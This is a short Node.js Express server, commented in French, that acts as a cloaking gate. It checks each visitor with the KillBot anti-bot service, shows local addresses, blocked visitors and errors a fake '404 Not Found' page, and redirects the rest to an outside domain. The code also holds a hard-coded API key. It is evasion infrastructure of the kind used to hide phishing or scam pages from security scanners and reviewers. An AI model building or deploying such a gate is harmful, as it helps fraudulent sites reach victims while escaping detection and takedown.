import express from 'express';
import KillBot from 'killbot.to';

const app = express();
const PORT = process.env.PORT || 3000;

// KillBot config
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const killBot = new KillBot(apiKey, 'default');

// Détecter IP locale
function isLocalIp(ip) {
  if (!ip) return true;
  return (
    ip.startsWith('127.') ||
    ip.startsWith('10.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('::1') ||
    ip === '0.0.0.0'
  );
}

// Faux 404 HTML
const fake404 = `
<!DOCTYPE html>
<html><head><title>404 Not Found</title></head>
<body><h1>Not Found</h1></body></html>`;

app.get('/', async (req, res) => {
  // Récup. IP => x-forwarded-for ou fallback
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  if (ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }

  // Si IP locale => renvoyer un faux 404 direct
  if (isLocalIp(ip)) {
    return res.status(404).send(fake404);
  }

  try {
    // Tenter KillBot
    const result = await killBot.checkReq(req);
    if (result.block) {
      return res.status(404).send(fake404);
    } else {
      return res.redirect('https://maurpie.com');
    }
  } catch (err) {
    console.error('KillBot error:', err);
    // Si “Invalid IP” ou autre => 404
    return res.status(404).send(fake404);
  }
});

app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});